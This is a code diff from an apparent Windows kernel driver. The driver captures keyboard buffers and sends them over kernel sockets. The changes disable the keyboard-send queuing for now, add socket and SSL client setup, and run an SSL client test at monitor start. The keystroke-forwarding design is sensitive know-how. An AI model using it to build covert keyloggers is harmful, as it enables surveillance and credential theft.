@@ -4,6 +4,7 @@
 #include <inc/ntapiex.h>
 #include <inc/processtable.h>
 #include <inc/sslclient.h>
+#include <inc/sockets.h>
 
 #define __SUBCOMPONENT__ "ecore"
 
@@ -49,7 +50,7 @@ NTSTATUS MonitorSendKbdBufWorker(PKBD_BUFF_ENTRY BuffEntry)
 		goto cleanup;
 	}
 
-	Status = MWskSendAll(Socket, BuffEntry->Bytes, BuffEntry->BytesUsed);
+	Status = MWskSendAll(Socket, BuffEntry->Bytes, BuffEntry->BytesUsed, NULL);
 	if (!NT_SUCCESS(Status)) {
 		KLog(LError, "MWskSendAll error %x", Status);
 	}
@@ -69,7 +70,8 @@ cleanup:
 
 VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry)
 {
-	SysWorkerAddWork(&Monitor->NetWorker, MonitorSendKbdBufWorker, BuffEntry);
+	KLog(LInfo, "MonitorSendKbdBuf EMPTY!!!");
+//	SysWorkerAddWork(&Monitor->NetWorker, MonitorSendKbdBufWorker, BuffEntry);
 }
 
 PMONITOR
@@ -94,6 +96,13 @@ VOID
 	Monitor->State = MONITOR_STATE_STOPPED;
 }
 
+NTSTATUS 
+	ssl_client_test_Worker(PVOID Context)
+{
+	ssl_client_test();
+	return STATUS_SUCCESS;
+}
+
 NTSTATUS
     MonitorStartInternal(PMONITOR Monitor)
 {
@@ -104,6 +113,16 @@ NTSTATUS
 		KLog(LError, "Monitor already started");
 		KeReleaseGuardedMutex(&Monitor->Mutex);
 		return STATUS_TOO_LATE;
+	}
+
+	if (0 != sock_init()) {
+		KLog(LError, "sock_init failed");
+		goto start_failed;
+	}
+
+	if (0 != ssl_client_init()) {
+		KLog(LError, "ssl_client_init failed");
+		goto start_failed;
 	}
 
 	Status = ProcessTableStart(&Monitor->ProcessTable);
@@ -144,6 +163,8 @@ NTSTATUS
 	
 	Monitor->State = MONITOR_STATE_STARTED;
 	KeReleaseGuardedMutex(&Monitor->Mutex);
+
+	SysWorkerAddWork(&Monitor->RequestWorker, ssl_client_test_Worker, NULL);
 
 	return STATUS_SUCCESS;
 
@@ -197,8 +218,6 @@ NTSTATUS
     MonitorStart()
 {   
     KLog(LInfo, "MonitorStart");
- 
-	ssl_client_test();
 
 	return MonitorStartInternal(&g_Monitor);
 }
